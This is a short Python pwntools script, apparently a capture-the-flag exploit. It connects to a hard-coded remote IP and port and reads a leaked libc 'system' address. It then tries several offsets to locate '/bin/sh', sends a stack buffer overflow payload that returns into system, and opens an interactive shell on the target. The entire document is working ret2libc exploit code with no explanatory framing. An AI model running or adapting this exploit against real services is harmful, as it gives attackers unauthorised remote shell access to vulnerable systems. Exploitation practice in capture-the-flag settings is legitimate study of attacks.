from pwn import *

plus=[0xf865e,0x12231f,0x1224df,0x14ab7d]

for i in range(len(plus)):
    r=remote("54.210.217.206",1240)
    context.log_level='debug'
    system=int(r.recvline().strip(),16)
    binsh=system+plus[i]
    pay=b'a'*0x1c
    pay+=b'b'*4
    pay+=p32(system)
    pay+=p32(0)
    pay+=p32(binsh)
    r.sendline(pay)
    r.interactive()
    r.close()
